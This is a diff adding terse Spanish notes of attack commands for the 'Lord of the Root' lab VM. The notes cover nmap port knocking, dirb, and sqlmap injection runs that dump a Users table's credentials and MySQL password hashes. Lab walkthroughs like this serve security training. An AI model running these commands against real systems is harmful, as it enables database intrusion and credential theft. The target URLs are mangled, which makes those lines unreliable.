@@ -1,0 +1,33 @@
+Comandos lord of the root
+Requisitos de finalización
+knock ip 1 2 3
+
+nmap -Pn  --max-retries 0 -p 1 172.16.1.12
+nmap -Pn --max-retries 0 -p 2 172.16.1.12
+nmap -Pn  --max-retries 0 -p 3 172.16.1.12
+
+
+dirb ...
+
+base64 -d archivo con el código
+
+sqlmap -u http172.16.1.121337978345210index.php --forms
+
+Empleando burpsuite
+Salvamos la petición post en un archivo llamado burp-post.txt en este caso en burpsuite.
+
+sqlmap -r burp-post.txt --dbs
+
+sqlmap -o -r burp-post.txt -D esquema --tables
+
+sqlmap -o -r burp-post.txt -D esquema -T tabla --columns
+
+sqlmap -o -r burp-post.txt -D esquema -T tabla -C columnas --dump
+
+Directamente sin burpsuite
+sqlmap -o -u http172.16.1.121337978345210index.php --forms --dbs
+sqlmap -o -u http172.16.1.121337978345210index.php --forms -D Webapp --tables
+sqlmap -o -u http172.16.1.121337978345210index.php --forms -D Webapp -T Users --columns
+sqlmap -o -u http172.16.1.121337978345210index.php --forms -D Webapp -T Users -C id,username,password --dump
+
+sqlmap -o -u http172.16.1.121337978345210index.php --forms -D mysql -T user -C User,Password --dump
